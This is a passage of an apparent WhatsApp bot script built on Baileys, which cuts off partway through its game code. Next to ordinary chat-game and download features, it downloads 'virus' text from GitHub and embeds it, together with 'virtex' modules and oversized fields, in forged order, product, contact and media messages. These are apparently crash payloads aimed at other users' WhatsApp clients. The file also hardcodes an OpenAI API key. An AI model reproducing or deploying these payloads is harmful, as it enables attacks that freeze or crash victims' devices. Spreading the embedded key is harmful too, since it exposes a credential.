const { modul } = require('./module');
const { axios, fetch, baileys, chalk, cheerio, child_process, crypto, fs, ffmpeg, jsobfus, moment, ms, speed, util } = modul;
const { exec, spawn, execSync } = child_process
const { BufferJSON, WA_DEFAULT_EPHEMERAL, generateWAMessageFromContent, proto, generateWAMessageContent, generateWAMessage, prepareWAMessageMedia, areJidsSameUser, getContentType } = require('@adiwajshing/baileys')
const { smsg, formatp, tanggal, formatDate, getTime, isUrl, sleep, clockString, runtime, fetchJson, getBuffer, jsonformat, format, parseMention, getRandom, reSize, generateProfilePicture } = require('./lib/myfunc')

const { buttonvirus } = require('./scrape/buttonvirus')
const { ngazap } = require('./baseikal/virtex/ngazap')
const os = require('os')
const { wmi } = require('./baseikal/virtex/buttonkal')
/*let { sticker } = require('./lib/sticker.js')*/
const Carbon = require('unofficial-carbon-now-sh')
const { yta, ytv, servers } = require('./lib/y2mate')
const { color, bgcolor } = require('./lib/color')
const { uptotelegra } = require('./scrape/upload')
const { auto_downloadTT_JSON } = require('./lib/Data_Location.js')
const tiktok = require('./scrape/tiktok')
const audionyee = fs.readFileSync('./y.mp3')
const owner = JSON.parse(fs.readFileSync('./database/owner.json').toString())
const audionye = JSON.parse(fs.readFileSync('./lib/vn.json'))
global.db = JSON.parse(fs.readFileSync('./database/database.json'))
if (global.db) global.db = {
sticker: {},
database: {},
game: {},
others: {},
users: {},
chats: {},
...(global.db || {})
}
lagunyeee = ["Sound","Bodyrock","Sound1"]
global.author = 'FizzxMods'
global.owner = ["6285172200670"]
global.packname = 'Fizzx'
global.ownerName = 'Fizz'
global.ownerNumber = ["085172200670@s.whatsapp.net"]
global.prefa = ['','.']
global.mess = {
    wait: 'Wait Sis Please be patient',
    succes: 'Good Luck Sis ?',
    admin: 'Group Admin Special Features!!!',
    botAdmin: 'Bots Must Be Admins First!!!',
    owner: 'Lu Siapa Kocak?',
    group: 'Features Used Only For Groups!!!',
    private: 'Features Used Only For Private Chat!!!',
    bot: 'Bot Number User Special Features!!!',
    error: 'Error Sis, Please Chat Owner...',
}
const creator = `FizzxModsss`
let thumb = fs.readFileSync('./baseikal/image/ok.jpg')

//━━━━━━━━━━━━━━━[ DATABASE ]━━━━━━━━━━━━━━━━━//
let _buruan = JSON.parse(fs.readFileSync('./src/hasil_buruan.json'));
let _darahOrg = JSON.parse(fs.readFileSync('./src/darah.json'))
let db_menfes = JSON.parse(fs.readFileSync('./database/menfess.json'));
var kuismath = JSON.parse(fs.readFileSync('./data_json/db.data.game.math.json'))
var _family100 =  JSON.parse(fs.readFileSync('./data_json/db.data.game.family100.json'))
var tebakgambar =  JSON.parse(fs.readFileSync('./data_json/db.data.game.tebakgambar.json'))
var tebakkata =  JSON.parse(fs.readFileSync('./data_json/db.data.game.tebakkata.json'))
var caklontong =  JSON.parse(fs.readFileSync('./data_json/db.data.game.lontong.json'))
var caklontong_desk =  JSON.parse(fs.readFileSync('./data_json/db.data.game.lontong_desk.json'))
var tebakkalimat =  JSON.parse(fs.readFileSync('./data_json/db.data.game.kalimat.json'))
var tebaklirik =  JSON.parse(fs.readFileSync('./data_json/db.data.game.lirik.json'))
var tebaktebakan =  JSON.parse(fs.readFileSync('./data_json/db.data.game.tebakan.json'))
var tebaklagu =  JSON.parse(fs.readFileSync('./data_json/db.data.game.tebaklagu.json'))
const auto_downloadTT = auto_downloadTT_JSON

module.exports = rixx = async (rixx, m, chatUpdate, store) => {
try {
        const body = (m.mtype === 'conversation') ? m.message.conversation : (m.mtype == 'imageMessage') ? m.message.imageMessage.caption : (m.mtype == 'videoMessage') ? m.message.videoMessage.caption : (m.mtype == 'extendedTextMessage') ? m.message.extendedTextMessage.text : (m.mtype == 'buttonsResponseMessage') ? m.message.buttonsResponseMessage.selectedButtonId : (m.mtype == 'listResponseMessage') ? m.message.listResponseMessage.singleSelectReply.selectedRowId : (m.mtype == 'templateButtonReplyMessage') ? m.message.templateButtonReplyMessage.selectedId : (m.mtype === 'messageContextInfo') ? (m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectReply.selectedRowId || m.text) : ''
        const budy = (typeof m.text == 'string' ? m.text : '')
        const prefix = prefa ? /^[°•π÷×¶∆£¢€¥®=????+✓_=|~!?@#%^&.©^]/gi.test(body) ? body.match(/^[°•π÷×¶∆£¢€¥®=????+✓_=|~!?@#%^&.©^]/gi)[0] : "" : prefa ?? global.prefix
        const content = JSON.stringify(m.message)
        const { type, quotedMsg, mentioned, now, fromMe } = m
        const isCmd = body.startsWith(prefix)
        const from = m.key.remoteJid
        var chats = (type === 'conversation' && m.message.conversation) ? m.message.conversation : (type === 'imageMessage') && m.message.imageMessage.caption ? m.message.imageMessage.caption : (type === 'videoMessage') && m.message.videoMessage.caption ? m.message.videoMessage.caption : (type === 'extendedTextMessage') && m.message.extendedTextMessage.text ? m.message.extendedTextMessage.text : (type === 'buttonsResponseMessage') && quotedM.fromMe && m.message.buttonsResponseMessage.selectedButtonId ? m.message.buttonsResponseMessage.selectedButtonId : (type === 'templateButtonReplyMessage') && quotedM.fromMe && m.message.templateButtonReplyMessage.selectedId ? m.message.templateButtonReplyMessage.selectedId : (type === 'messageContextInfo') ? (m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectReply.selectedRowId) : (type == 'listResponseMessage') && quotedM.fromMe && m.message.listResponseMessage.singleSelectReply.selectedRowId ? m.message.listResponseMessage.singleSelectReply.selectedRowId : ""
if (chats == undefined) { chats = '' }
        const command = body.replace(prefix, '').trim().split(/ +/).shift().toLowerCase()
        const args = body.trim().split(/ +/).slice(1)
        const pushname = m.pushName || "No Name"
        const botNumber = await rixx.decodeJid(rixx.user.id)
        const itsMerixx = [botNumber, ...owner].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)
        const itsMe = m.sender == botNumber ? true : false
        const text = q = args.join(" ")
        const quoted = m.quoted ? m.quoted : m
        const mime = (quoted.msg || quoted).mimetype || ''
        const jam = moment.tz('asia/jakarta').format('HH:mm:ss')
		const dt = moment(Date.now()).tz('Asia/Jakarta').locale('id').format('a')
		const ucapanWaktu = "Selamat "+dt.charAt(0).toUpperCase() + dt.slice(1)
		const wib = moment.tz('Asia/Jakarta').format('HH : mm : ss')
        const wita = moment.tz('Asia/Makassar').format('HH : mm : ss')
        const wit = moment.tz('Asia/Jayapura').format('HH : mm : ss')   
        const tanggal = moment.tz('Asia/Jakarta').format('DD/MM/YY')  
        const isMedia = /image|video|sticker|audio/.test(mime)
        const qmsg = (quoted.msg || quoted)
        const isImage = (type == 'imageMessage')
		const isVideo = (type == 'videoMessage')
		const isSticker = (type == 'stickerMessage')
		const isQuotedMsg = (type == 'extendedTextMessage')
		const isQuotedImage = isQuotedMsg ? content.includes('imageMessage') ? true : false : false
		const isQuotedAudio = isQuotedMsg ? content.includes('audioMessage') ? true : false : false
		const isQuotedDocument = isQuotedMsg ? content.includes('documentMessage') ? true : false : false
		const isQuotedVideo = isQuotedMsg ? content.includes('videoMessage') ? true : false : false
		const isQuotedSticker = isQuotedMsg ? content.includes('stickerMessage') ? true : false : false
        const hariPuasa = new Date('Maret 22, 2023 00:00:00')
        const sekarang = new Date().getTime()
        const Selisih = hariPuasa - sekarang
        const jhari = Math.floor( Selisih / (1000 * 60 * 60 * 24));
        const jjam = Math.floor( Selisih % (1000 * 60 * 60 * 24) / (1000 * 60 * 60))
        const jmenit = Math.floor( Selisih % (1000 * 60 * 60) / (1000 * 60))
        const jdetik = Math.floor( Selisih % (1000 * 60) / 1000)
        const sender = m.isGroup ? (m.key.participant ? m.key.participant : m.participant) : m.key.remoteJid
             const isGroup = m.chat.endsWith('@g.us')
             const isAutoDownTT = auto_downloadTT.includes(from) ? true : false
        const groupMetadata = m.isGroup ? await rixx.groupMetadata(m.chat).catch(e => {}) : ''
        const groupName = m.isGroup ? groupMetadata.subject : ''
        const participants = m.isGroup ? await groupMetadata.participants : ''
        const groupAdmins = m.isGroup ? await participants.filter(v => v.admin !== null).map(v => v.id) : ''
        const groupOwner = m.isGroup ? groupMetadata.owner : ''
        const groupMembers = m.isGroup ? groupMetadata.participants : ''
    	const isBotAdmins = m.isGroup ? groupAdmins.includes(botNumber) : false
        const isGroupAdmins = m.isGroup ? groupAdmins.includes(m.sender) : false
    	const isAdmins = m.isGroup ? groupAdmins.includes(m.sender) : false
    	const isDev = ["6285172200670@s.whatsapp.net"].includes(sender) ? true : false
    const wm = rixx.user.name
    ApikeyOpenAi = "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"
	
try {
const isNumber = x => typeof x === 'number' && !isNaN(x)
const user = global.db.users[m.sender]
if (typeof user !== 'object') global.db.users[m.sender] = {}
const chats = global.db.chats[m.chat]
if (typeof chats !== 'object') global.db.chats[m.chat] = {}
} catch (err) {
console.error(err)
}

if (!rixx.public) {
if (!m.key.fromMe) return
}

if (!m.isGroup && isCmd && !fromMe) {
console.log('->[\x1b[1;32mCMD\x1b[1;37m]', color(moment(m.messageTimestamp * 1000).format('DD/MM/YYYY HH:mm:ss'), 'yellow'), color(`${prefix+command} [${args.length}]`), 'from', color(pushname))
}
if (m.isGroup && isCmd && !fromMe) {
console.log('->[\x1b[1;32mCMD\x1b[1;37m]', color(moment(m.messageTimestamp *1000).format('DD/MM/YYYY HH:mm:ss'), 'yellow'), color(`${prefix+command} [${args.length}]`), 'from', color(pushname), 'in', color(groupName))
}

if (m.sender.startsWith('212')) return rixx.updateBlockStatus(m.sender, 'block')

ppuser = 'https://raw.githubusercontent.com/JasRunJ/filenya/master/a4cab58929e036c18d659875d422244d.jpg'
ppnyauser = await reSize(ppuser, 200, 200)

const doc = { 
key: {
fromMe: false, 
participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "" } : {}) 
},
"message": {
"documentMessage": {
"url": "https://mmg.whatsapp.net/d/f/Aj85sbZCtNtq1cJ6JupaBUTKfgrl2zXRXGvVNWAbFnsp.enc",
"mimetype": "application/octet-stream",
"fileSha256": "TSSZu8gDEAPhp8vjdtJS/DXIECzjrSh3rmcoHN76M9k=",
"fileLength": "64455",
"pageCount": 1,
"mediaKey": "P32GszzU5piUZ5HKluLD5h/TZzubVJ7lCAd1PIz3Qb0=",
"fileName": `Fizzx${ngazap(prefix)}`,
"fileEncSha256": "ybdZlRjhY+aXtytT0G2HHN4iKWCFisG2W69AVPLg5yk="
}}}
const lep = {
key: {
fromMe: false, 
participant: `0@s.whatsapp.net`, 
...({ remoteJid: "" }) 
}, 
message: { 
"imageMessage": { 
"mimetype": "image/jpeg", 
"caption": `${buttonvirus}`, 
"jpegThumbnail": ppnyauser
}
}
}
const hw = { 
key: {
fromMe: false, 
participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "0@s.whatsapp.net" } : {}) 
},
"message": {
"extendedTextMessage": {
"text": "© [ Fizz ]️",
"previewType": "NONE",
"contextInfo": {
"stanzaId": "3EB0382EDBB2",
"participant": "6285172200670@s.whatsapp.net"
}}}}
const anjaaaaay = (teks) => {
 rixx.sendMessage(m.chat, { image: thumb, caption: teks, contextInfo:{forwardingScore: 9999,isForwarded: true,"externalAdReply": {"title": `FizzxModss`,"body": ``,
previewType: "PHOTO",
showAdAttribution: true,
sourceUrl: `https://www.google.com/url?sa=t&source=web&rct=j&url=https://chat.openai.com/auth/login&ved=2ahUKEwjE2I_Kl7X8AhWi2HMBHUWcB3MQFnoECBsQAQ&usg=AOvVaw2tooVVFlzOmUjyM15PSIEe`,
thumbnailUrl: 'https://ibb.co/mhcbQRC', 
thumbnail: thumb,
}
}}, { quoted: m})
}
const anjay = (teks) => {
 rixx.sendMessage(rixx.chat, { image: ppnyauser, caption: teks, contextInfo:{forwardingScore: 9999,isForwarded: true,"externalAdReply": {"title": `FizzxModss`,"body": ``,
previewType: "PHOTO",
showAdAttribution: true,
sourceUrl: `https://yandex.com`,
thumbnailUrl: 'https://telegra.ph/file/f75dc872e7ee995ab2b88.jpg', 
thumbnail: ppnyauser,
}
}}, { quoted:hw})
}
const stckntl = { key: { fromMe: false, "participant": `0@s.whatsapp.net`, "remoteJid": `6283141926935-1621036495@g.us` }, "message": { "stickerMessage": {
						"url": "https://mmg.whatsapp.net/d/f/AvXxTPBtSczwDxhUMioyItF4S_WX_l35RGXO4yPVSDuL.enc'",
						"fileSha256": "b/ruAx0XVtg83ksTBXhm2txq8+OxS9mZPUH8wwLdsWQ=",
						"fileEncSha256": "QLIYlkwUlk1lNrxXm5SMnHCYS/3FqL2ZX6Sh8yEvweI=",
						"mediaKey": "GxOGcl8r2i9Q+euLEKqJ9Osq9Q2cyN+GI1laPmj2gsU=",
						"mimetype": "image/webp",
						"height": 64,
						"width": 64,
						"directPath": "/v/t62.15575-24/41268406_472960691072506_5470266215553697376_n.enc?ccb=11-4&oh=01_AVyopRi4z5Whjaw5Sy_AHCm7kRVa0UxRcS9UkVcfBQZriw&oe=6226388A",
						"fileLength": "18576",
						"mediaKeyTimestamp": "1644303830" , } }
						}
						let fdoc = {key : {participant : '0@s.whatsapp.net'},message: {documentMessage: {title: `FizzxMods`, jpegThumbnail: ppnyauser}}}
   	     let fvn = {key: {participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "6289643739077-1613049930@g.us" } : {})},message: { "audioMessage": {"mimetype":"audio/ogg; codecs=opus","seconds":99999,"ptt": "true"}} } 
	        let fgif = {key: {participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "6289643739077-1613049930@g.us" } : {})},message: {"videoMessage": { "title": `SendVnWithAudio`, "h": `Hmm`,'seconds': '99999', 'gifPlayback': 'true', 'caption': `Woyyy`,  'jpegThumbnail': ppnyauser}}}
			let fgclink = {key: {participant: "0@s.whatsapp.net","remoteJid": "0@s.whatsapp.net"},"message": {"groupInviteMessage": {"groupJid": "6288213840883-1616169743@g.us","inviteCode": "m","groupName": "rixxz", "caption": `© FizzxMods`, 'jpegThumbnail': ppnyauser}}}
			let fgclink2 = {key: {participant: "0@s.whatsapp.net","remoteJid": "0@s.whatsapp.net"},"message": {"groupInviteMessage": {"groupJid": "6288213840883-1616169743@g.us","inviteCode": "m","groupName": "P", "caption": `FizzxMods 🔥`, 'jpegThumbnail': ppnyauser}}}
			let fvideo = {key: { fromMe: false,participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "6289643739077-1613049930@g.us" } : {}) },message: { "videoMessage": { "title":`© FizzxMods`, "h": `Hmm`,'seconds': '99999', 'caption': `© Fizzxmods`, 'jpegThumbnail': ppnyauser}}}
			let floc = {contextInfo: {"forwardingScore":999,"isForwarded":true,'stanzaId': 'B826873620DD5947E683E3ABE663F263', 'participant':`0@s.whatsapp.net`, 'remoteJid': '6283136505591-1614953337@g.us', 'quotedMessage': {"locationMessage": {"degreesLatitude": 41.893714904785156, "degreesLongitude": -87.63370513916016, "name": `FizzxMods` , 'jpegThumbnail':ppnyauser}}}}
			let fkontak = { key: {participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: `6283136505591-1614953337@g.us` } : {}) }, message: { 'contactMessage': { 'displayName': `© FizzxMods`, 'vcard': `BEGIN:VCARD\nVERSION:3.0\nN:XL;Fizzxmods,;;;\nFN:FizzxMods,\nitem1.TEL;waid=${sender.split('@')[0]}:${sender.split('@')[0]}\nitem1.X-ABLabel:Ponsel\nEND:VCARD`, 'jpegThumbnail': ppnyauser, thumbnail: ppnyauser,sendEphemeral: true}}}
//==================( Quoted ) =================//
let virus = await fetch("https://raw.githubusercontent.com/Nevt12/basedb/main/v12.txt")
let virus2 =  await fetch("https://raw.githubusercontent.com/Nevt12/basedb/main/v26.txt")

const shield2 = {
  key: {
    fromMe: false,
    participant: '0@s.whatsapp.net',
    remoteJid: 'status@broadcast'
  },
  message: {
    "imageMessage": {
        "url": "https://mmg.whatsapp.net/d/f/At0x7ZdIvuicfjlf9oWS6A3AR9XPh0P-hZIVPLsI70nM.enc",
        "mimetype": "image/jpeg",
        "caption": "ALDI GANZ",
        "fileSha256": "+Ia+Dwib70Y1CWRMAP9QLJKjIJt54fKycOfB2OEZbTU=",
        "fileLength": "28777",
        "height": 1080,
        "width": 1079,
        "mediaKey": "vXmRR7ZUeDWjXy5iQk17TrowBzuwRya0errAFnXxbGc=",
        "fileEncSha256": "sR9D2RS5JSifw49HeBADguI23fWDz1aZu4faWG/CyRY=",
        "directPath": "/v/t62.7118-24/21427642_840952686474581_572788076332761430_n.enc?oh=3f57c1ba2fcab95f2c0bb475d72720ba&oe=602F3D69",
        "mediaKeyTimestamp": "1610993486",
        "jpegThumbnail": fs.readFileSync('./baseikal/image/ok.jpg'),
        "scansSidecar": "1W0XhfaAcDwc7xh1R8lca6Qg/1bB4naFCSngM2LKO2NoP5RI7K+zLw=="
     }
  }
}
//# Kal
const kal = { 
key: {
fromMe: false, 
participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "@s.whatsapp.net" } : {}) 
},
"message": {
"extendedTextMessage": {
"text": `${wmi}`,
"previewType": "NONE",
"contextInfo": {
"stanzaId": "3EB0382EDBB2",
"participant": "@s.whatsapp.net"
	}}}}	
//=================================================//		
//# Troli
const trol = { 
key: {
fromMe: false, 
            fromMe: false, 
            participant: `0@s.whatsapp.net`, 
            ...({ remoteJid: "" }) 
},
"message": {
"orderMessage": {
						"orderId": "594071395007984",
						"thumbnail": fs.readFileSync('./baseikal/image/ok.jpg'),
						"itemCount": 100000000000,
						"status": "INQUIRY",
						"surface": "CATALOG",
						"message": "",
						"orderTitle": `${wmi}`,
						"sellerJid": "62857887347569@s.whatsapp.net",
						"token": "AR40+xXRlWKpdJ2ILEqtgoUFd45C8rc1CMYdYG/R2KXrSg==",
						"totalAmount1000": "500000000000000",
						"totalCurrencyCode": "IDR"
	}}}
//#Troli 2
const ftrolii ={key: {fromMe: false,
"participant":"0@s.whatsapp.net", 
"remoteJid": "@g.us"},
"message": {orderMessage: 
{itemCount: 100000000000,
status: 200, 
thumbnail: thumb, 
surface: 200, 
message: `© ${wmi}`,
token: "AR40+xXRlWKpdJ2ILEqtgoUFd45C8rc1CMYdYG/R2KXrSg==",
totalAmount1000: "500000000000000",
totalCurrencyCode: "IDR",
orderTitle: `${wmi} ${virus2}`,
sellerJid: '0@s.whatsapp.net'}}, 
contextInfo: {"forwardingScore":999,"isForwarded":true},
sendEphemeral: true}	
//=================================================//	
// doc
/*const doc = { 
key: {
fromMe: false, 
participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "" } : {}) 
},
"message": {
"documentMessage": {
"url": "https://mmg.whatsapp.net/d/f/Aj85sbZCtNtq1cJ6JupaBUTKfgrl2zXRXGvVNWAbFnsp.enc",
"mimetype": "application/octet-stream",
"fileSha256": "TSSZu8gDEAPhp8vjdtJS/DXIECzjrSh3rmcoHN76M9k=",
"fileLength": "64455",
"pageCount": 1,
"mediaKey": "P32GszzU5piUZ5HKluLD5h/TZzubVJ7lCAd1PIz3Qb0=",
"fileName": `HW MODS WA${ngazap(prefix)}`,
"fileEncSha256": "ybdZlRjhY+aXtytT0G2HHN4iKWCFisG2W69AVPLg5yk="
}}}
//# Sticker
const bugstik = { 
        key: { 
            fromMe: false, 
            participant: `0@s.whatsapp.net`, 
            ...({ remoteJid: "" }) 
        }, 
        "message": {
 "orderMessage": {
"orderId": "594071395007984",
"thumbnail": fs.readFileSync('./baseikal/image/ok.jpg'),
"itemCount": 100000000000,
"status": "INQUIRY",
"surface": "CATALOG",
"message": `${wm}`,
"orderTitle": `${wm}`,
"sellerJid": "62857887347569@s.whatsapp.net",
"token": "AR40+xXRlWKpdJ2ILEqtgoUFd45C8rc1CMYdYG/R2KXrSg==",
"totalAmount1000": "500000000000000",
"totalCurrencyCode": "IDR"
            } 
        }}*/
//=================================================//
//# Pdf
const bugpdf = { 
        key: { 
            fromMe: false, 
            participant: `0@s.whatsapp.net`, 
            ...({ remoteJid: "" }) 
        }, 
        message: { 
            "imageMessage": { 
                "mimetype": "image/jpeg", 
                "caption": `${wmi}`, 
                "jpegThumbnail": thumb
            } 
        } 
    }
//=================================================//   
//# Vn
const adehvn = { 
        key: { 
            fromMe: false, 
            participant: `0@s.whatsapp.net`, 
            ...({ remoteJid: "" }) 
        }, 
        "message": {
"locationMessage": {}
            } 
        } 
//=================================================//       
//# Image
const bugimage = { 
        key: { 
            fromMe: false, 
            participant: `0@s.whatsapp.net`, 
            ...({ remoteJid: "" }) 
        }, 
        "message": {
  "audioMessage": {
"url": "https://mmg.whatsapp.net/d/f/AqXaKHS3AY_ONTjToJq-wEqO11SqPgaAzGLzg02IBAVP.enc",
"mimetype": "audio/aac",
"fileSha256": "3kPrHVqimG+Y7dLgq/q+KPFbZczIgg7SBbuU3UdrinQ=",
"fileLength": "285473",
"seconds": 9999999999,
"caption": `${wmi}`,
"ptt": false,
"mediaKey": "SPVvc1ACQyGfWw8CFuqtQ8RUrv8rsa1JK5AkqcMiPEI=",
"fileEncSha256": "H8EQqzkVWPOvrjoAOGC9FgJkO5KMlScV8+G7ucyVwlo=",
"directPath": "/v/t62.7114-24/35331424_231575432280264_9094348830349350878_n.enc?ccb=11-4&oh=bb04b71d85c088ec24446502b8c52d14&oe=61767ADB",
"mediaKeyTimestamp": "1632753911"
            } 
        } 
    }
//=================================================//        
const messa = await prepareWAMessageMedia({ image: fs.readFileSync('./baseikal/image/ok.jpg') }, { upload: rixx.waUploadToServer })
const catalog = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"productMessage": {
"product": {
"productImage": messa.imageMessage,
"productId": "4383282311765462",
"title": `${wmi}`,
"description": `${virus2}`,
"currencyCode": "IDR",
"bodyText": `${virus}`,
"footerText": `${wmi}`,
"priceAmount1000": "10000000",
"productImageCount": 1,
"firstImageId": 1,
"salePriceAmount1000": "10000000",
"retailerId": `${wmi}`,
"url": "wa.me/62881037044211"
},
"businessOwnerJid": "62881037044211@s.whatsapp.net",
}
}), { userJid: m.chat, quoted: ftrolii })    
//=================================================//    
//# Contact
const fkontaak = { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(m.chat ? { remoteJid: "@broadcast" } : {})}, message: { "contactMessage":{"displayName": `${wm}${virus}`,"vcard":`BEGIN:VCARD\nVERSION:3.0\nN:2;rixx;;;\nFN:${wm}\nitem1.TEL;waid=6285172200670:6285172200670\nitem1.X-ABLabel:Mobile\nEND:VCARD` }}}  
//=================================================//   
//# Text
const main = {
  "key": {
"fromMe": false,
"participant": "0@s.whatsapp.net",
...({"remoteJid":''})
  },
  "message":{
"imageMessage":{
  "mimetype":"image/jpeg",
  "jpegThumbnail":fs.readFileSync('./baseikal/image/ok.jpg')
}
  }
}
//=================================================//   
   
members_id = []
	for (let mem of participants) {
	members_id.push(mem.jid)
	}
const SendVnWithAudio = (vnnya) => {
rixx.sendMessage(m.chat, { audio: vnnya,mimetype: 'audio/mp4', ptt: true , contextInfo:{forwardingScore: 9999,isForwarded: true, "externalAdReply": {"title": `FizzxMods 🔥`,"body": `SendVnWithAudio`, "previewType": "PHOTO","thumbnailUrl": ``,"thumbnail": ppnyauser,"sourceUrl": `https://chat.whatsapp.com/I4PXxNScx9WAmp5r4np6Is`}}} ,{quoted: fgclink2 })

}
const replyy = (teks) => {
rixx.sendMessage(m.chat, { text: teks, contextInfo:{forwardingScore: 9999,isForwarded: true,"externalAdReply": {"title": `FizzxMods 🔥`,"body": `FizzxMods`, "previewType": "PHOTO","thumbnailUrl": ``,"thumbnail": ppnyauser,"sourceUrl": `https://chat.whatsapp.com/I4PXxNScx9WAmp5r4np6Is`}}} ,{quoted: fgclink2 })
}
const reply = (teks) => {
return rixx.sendMessage(m.chat, { text: teks, contextInfo:{forwardingScore: 9999,isForwarded: true,"externalAdReply": {"title": `FizzxMods`,"body": `Hallo Tuan`, "previewType": "PHOTO","thumbnailUrl": ``,"thumbnail": ppnyauser,"sourceUrl": `https://yandex.com`}}} )
} 


//━━━━━━━━━━━━━━━[ SEND MESSAGES ]━━━━━━━━━━━━━━━━━//

rixx.send5ButLock = async (jid , text = '' , footer = '', lok, but = [], options = {}) =>{
      let bb = await reSize(lok, 300, 150)
      rixx.sendMessage(jid, { location: { jpegThumbnail: bb }, caption: text, footer: footer, templateButtons: but, ...options })
      }
      
      rixx.sendTextWithMentions = async (jid, text, quoted, options = {}) => rixx.sendMessage(jid, { text: text, mentions: [...text.matchAll(/@(\d{0,16})/g)].map(v => v[1] + '@s.whatsapp.net'), ...options }, { quoted })
      
    rixx.sendText = (jid, text, quoted = '', options) => rixx.sendMessage(jid, { text: text, ...options }, { quoted, ...options })

      
rixx.sendKontak = async (jid, kon, quoted = '', opts = {}) => {
let list = []
for (let i of kon) {
list.push({
displayName: await rixx.getName(i + '@s.whatsapp.net'),
vcard: `BEGIN:VCARD\n
VERSION:3.0\n
N:${await rixx.getName(i + '@s.whatsapp.net')}\n
FN:${await rixx.getName(i + '@s.whatsapp.net')}\n
item1.TEL;waid=${i}:${i}\n
item1.X-ABLabel:Ponsel\n
item2.EMAIL;type=INTERNET:FizzXyzzz@gmail.com\n
item2.X-ABLabel:Email\n
item3.URL:https://github.com/FizzXyzz\n
item3.X-ABLabel:Github\n
item4.ADR:;;Indonesia;;;;\n
item4.X-ABLabel:Region\n
END:VCARD`
})
}
rixx.sendMessage(jid, { contacts: { displayName: `${list.length} Kontak`, contacts: list }, ...opts }, { quoted })
}
//━━━━━━━━━━━━━━━[ AKHIR ]━━━━━━━━━━━━━━━━━//




if (command) {
/*rixx.sendPresenceUpdate('composing', from)*/
rixx.sendPresenceUpdate('recording', from)
rixx.readMessages([m.key])
}

//---------------------------[ Waktu Asia & Time ]--------------------------------//

const hariini = moment.tz('Asia/Jakarta').format('dddd, DD MMMM YYYY')
const barat = moment.tz('Asia/Jakarta').format('HH:mm:ss')
const tengah = moment.tz('Asia/Makassar').format('HH:mm:ss')
const timur = moment.tz('Asia/Jayapura').format('HH:mm:ss')

//TIME
const time2 = moment().tz('Asia/Jakarta').format('HH:mm:ss')  
 if(time2 < "23:59:00"){
var ucapanWaktu2 = 'Selamat Malam 🌌'
 }
 if(time2 < "19:00:00"){
var ucapanWaktu2 = 'Selamat Sore 🌃'
 }
 if(time2 < "18:00:00"){
var ucapanWaktu2 = 'Selamat Sore 🌅'
 }
 if(time2 < "15:00:00"){
var ucapanWaktu2 = 'Selamat Siang 🏙'
 }
 if(time2 < "11:00:00"){
var ucapanWaktu2 = 'Selamat Pagi 🌄'
 }
 if(time2 < "05:00:00"){
var ucapanWaktu2 = 'Selamat Pagi 🌉'
 } 
 
 
 
 //---------------------------[ FUNC CHAT OPEN AI ]--------------------------------//

ApikeyOpenAi = "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"
const ChatGPTRequest = async (text) => {

    const result = {
        success: false,
        data: null,
        message: "",
    }

    return await axios({
        method: 'POST',
        url: 'https://api.openai.com/v1/completions',
        data: {
            model: "text-davinci-003",
            prompt: text,
            max_tokens: 1000,
            temperature: 0
        },
        headers: {
            "accept": "application/json",
            "Content-Type": "application/json",
            "Accept-Language": "in-ID",
            "Authorization": `Bearer ${ApikeyOpenAi}`,
        },
    })
        .then((response) => {
            if (response.status == 200) {
                result.success = true;
                result.data = response.data?.choices?.[0]?.text || 'Aku gak tau';
            } else {
                result.message = "Failed response";
            }

            return result;
        })
        .catch((error) => {
            result.message = "Error : " + error.message;
            return result;
        })
}
const question = `${text}`
const response = await ChatGPTRequest(question)

//=================================================/
//=================================================//
//RPG FUNCTION
const { 
addInventoriDarah,cekDuluJoinAdaApaKagaDiJson,addDarah,kurangDarah, getDarah 
}= require('./src/darah.js')
const { 
cekInventoryAdaAtauGak,addInventori, addBesi, addEmas, addEmerald,addUmpan,addPotion,kurangBesi, kurangEmas, kurangEmerald, kurangUmpan,kurangPotion,getBesi, getEmas, getEmerald, getUmpan, getPotion
} = require('./src/alat_tukar.js')
const {addInventoriMonay,cekDuluJoinAdaApaKagaMonaynyaDiJson,addMonay,kurangMonay, getMonay 
} = require('./src/monay.js')
const { addInventoriLimit, cekDuluJoinAdaApaKagaLimitnyaDiJson, addLimit, kurangLimit, getLimit 
} = require('./src/limit.js')
const { cekDuluHasilBuruanNya, addInventoriBuruan, addIkan, addAyam,addKelinci,addDomba,addSapi, addGajah, kurangIkan, kurangAyam,kurangKelinci,kurangDomba,kurangSapi, kurangGajah, getIkan, getAyam,getKelinci,getDomba,getSapi, getGajah
} = require('./src/buruan.js')
let DarahAwal =global.rpg.darahawal
const isDarah = cekDuluJoinAdaApaKagaDiJson(m.sender)
const isCekDarah = getDarah(m.sender)
const isUmpan = getUmpan(m.sender)
const isPotion = getPotion(m.sender)
const isIkan = getIkan(m.sender)
const isAyam = getAyam(m.sender)
const isKelinci = getKelinci(m.sender)
const isDomba = getDomba(m.sender)
const isSapi = getSapi(m.sender)
const isGajah = getGajah(m.sender)
const isMonay = getMonay(m.sender)
const isLimit = getLimit(m.sender)
const isBesi = getBesi(m.sender)
const isEmas = getEmas(m.sender)
const isEmerald = getEmerald(m.sender)
const isInventory = cekInventoryAdaAtauGak(m.sender)
const isInventoriBuruan = cekDuluHasilBuruanNya(m.sender)
const isInventoryLimit = cekDuluJoinAdaApaKagaLimitnyaDiJson(m.sender)
const isInventoryMonay = cekDuluJoinAdaApaKagaMonaynyaDiJson(m.sender)
const ikan = ['🐟','🐠','🐡']

//━━━━━━━━━━━━━━━[ BATASSS ]━━━━━━━━━━━━━━━━━//
if (('family100'+m.chat in _family100) && isCmd) {
kuis = true
let room = _family100['family100'+m.chat]
let teks = budy.toLowerCase().replace(/[^\w\s\-]+/, '')
let isSurender = /^((me)?nyerah|surr?ender)$/i.test(m.text)
if (!isSurender) {
let index = room.jawaban.findIndex(v => v.toLowerCase().replace(/[^\w\s\-]+/, '') === teks)
if (room.terjawab[index]) return !0
room.terjawab[index] = m.sender
}
let isWin = room.terjawab.length === room.terjawab.filter(v => v).length
